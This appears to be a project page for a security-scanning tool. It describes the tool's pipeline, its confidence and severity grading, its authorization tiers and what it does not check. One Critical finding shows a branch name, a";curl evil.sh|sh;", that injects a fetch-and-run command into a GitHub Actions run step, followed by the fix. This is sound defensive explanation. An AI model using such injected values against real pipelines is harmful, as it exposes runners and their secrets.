A clean report here means “these scanners looked at these things and found nothing.” It never means “this is secure”, and the output is shaped so the two cannot be confused.

Why this exists

Never a quiet pass

A scanner that is missing, crashed, timed out, did not understand your language, or ran with one capability unusable does not disappear into a clean result. It turns up in the coverage ledger of that run and in the grade of the module that was counting on it.

The failure this prevents

trivy against a repository with no lockfile exits 0 and reports zero dependency findings — because package.json states ranges and a range is not a version. Nothing was read. Every layer above it correctly said there was nothing.

What happens instead

The adapter declares a partial refusal. The scanner still runs — its misconfiguration and secret checks are unaffected — and the one capability it cannot use is named in the ledger and grades that module blind.

Seven stages

discover → scope → scan → merge → verify → score → report

The deterministic half is code. The AI explains and judges, and never sits in the hot loop.

01discoverMap the attack surface: languages, entry points, what is even here.
02scopeTier ceiling, allowed hosts, authorization. A human edits this file.
03scanEvery applicable scanner runs. T0 reads files and sends nothing.
04mergeFindings unite by CWE family — not by the scanner's rule id.
05verifyA human records a verdict. The verifier may not be the tool that found it.
06scoreEach module is graded against a benchmark with recorded answers.
07reportVerdict, findings, what is not application code, and what was not checked.

Merge, never sum

open-redirect and javascript.express.security.audit.express-open-redirect are one finding with two sources. Independent corroboration is what raises confidence — not a longer list.

One cause, not twenty symptoms

One createHash('md5') reached from twenty call sites is one finding anchored at the cause, carrying twenty occurrences. Twenty findings would make the fix look twenty times bigger than it is.

What the two Critical findings are

A GitHub Actions workflow interpolating ${{ github.head_ref }} straight into a run: shell block. head_ref is the branch name chosen by whoever opens the pull request.

A fork branch named a";curl evil.sh|sh;" executes on the runner, with every secret that job can see.

Why this one mattered more than its severity

The file is a CI template the sdlc bundle ships to every project. One flaw there is one flaw replicated into every repository that adopted it — which is the difference between a finding and a finding worth paging someone about.

# the fix: stop interpolating, pass through the environment
- run: git fetch --no-tags origin "${{ github.base_ref }}"
+ env:
+   BASE_REF: ${{ github.base_ref }}
+ run: git fetch --no-tags origin "$BASE_REF"

Reading a finding

Severity is how bad. Confidence is how sure.

One number cannot carry both, and a tool that reports only severity hands you a queue you cannot order. High / Tentative needs someone to look. High / Certain needs someone to fix.

ConfidenceEarned byWhat to do with it
CertainConfirmed by reproduction, by a human who is not the tool that found itFix it.
FirmDataflow, a version match, or two independent scanners agreeingTriage first, then fix.
TentativeA single pattern match, or anything outside application codeLook before you believe it.

Severity is rescored here

Never copied from the tool. When two scanners disagree the report says they disagree instead of quietly picking one.

Two things never reach the bar alone

hardening — a missing defence rather than a present defect. And non-application code: tests, fixtures, examples, generated and vendored files. Reported, counted, kept out of the verdict.

Juice Shop produced 188 test-suite findings against 47 application ones. One list ordered by severity put seed-data passwords above the SQL injection in the login route.

sec modules

A rule count says nothing. A grade is a claim.

Every module is graded against a benchmark with recorded answers. Quote the grade when you quote the module.

GradeMeans
measuredFull marks against a corpus nobody here wrote. The only grade that can surprise us.
self-measuredFull marks against a benchmark we wrote. The weakest evidence there is.
partialFound some planted defects, missed others. The misses are named.
failingAn engine ran and found none of them.
blindAn engine ran with a capability this module needed unusable here. A zero is not a clean result — and it is deliberately not failing, which would blame the rules for a defect they were never shown.
unmeasuredNothing has ever checked this module. Not a pass.
no-engineNo scanner contributes at all, and the blind spot is written out.

Security is not one discipline

Twelve layers covered. Twenty named and not.

A bundle that answers twelve well is more useful than one claiming thirty and measuring none. The full inventory is docs/security-coverage-map.md; this is its shape.

Covered, graded

Secrets · injection · SCA · IaC · authn & session · authorization (static) · API · client-side · crypto · database · logging · AI / LLM

Built, blocked here

ZAP — installer needs elevation. nuclei — this environment refuses to execute it. Both adapters are proved by unit tests; neither has contributed a finding to any run.

Covered by nothing

SBOM & provenance · cloud posture · container image & runtime · mobile · network / TLS · privacy & PII data-flow · fuzzing · threat modelling · pentest (by design)

The largest gap is not a missing rule. Every project gets the same fourteen modules. A mobile banking app and an internal CRUD tool are handed one identical checklist, because scope.json decides how far a run may go and nothing decides what this kind of system should be checked for. A project profile would make an unchecked layer a recorded decision instead of an absence.

What it refuses to do

The one thing it never guesses is authorization

TierWhat it sends
T0Nothing. Reads files. The default — you do not need permission to read your own repository.
T1Plain reads of known paths, as an ordinary client would. No parameters added, no path guessing.
T2A handful of benign requests that vary a parameter. Nothing the application could read as an attack.
T3Requests the application may well read as an attack: injection probes, fuzzing.
T4Requests that may modify or destroy data.

Raising the ceiling is a human editing a file

Not a flag, not a prompt, not something an agent can talk its way into. A scan above the ceiling is refused with exit 2 and a named gate, and the refusal says which line of which file would have to change.

Hard limits, not preferences

Authorized targets only — your own code, employer systems with authorization, staging, CTF, deliberately vulnerable practice apps. Never a third party, never production.

No exploit development, no denial of service, no data destruction, no detection evasion. A finding is proved by the smallest safe evidence, never by damage.

No secret is ever written to a report, a baseline, a commit or a tool argument. A judgement whose reason contains a credential is refused outright.

What this does not do

It is not a pentest

It writes no exploits, and the dynamic tiers have been exercised against a local benchmark — not against real infrastructure.

Business logic is out of reach

M11, no-engine, permanently. Abuse cases, pricing flaws, workflow bypasses — the defects that cost real money — need a human who understands the intended flow.

It has one profile

Every project gets the same fourteen modules. Choosing the approach per system is still yours.

Nobody outside this project has reviewed it

That, not a missing feature, is the largest gap in its evidence. Every grade above is self-assessed against corpora — two of which we did not write, which is the strongest claim available and still not a second pair of eyes.

It is a tool for someone who can read the output. It is not a button that tells a person who cannot whether they are safe.
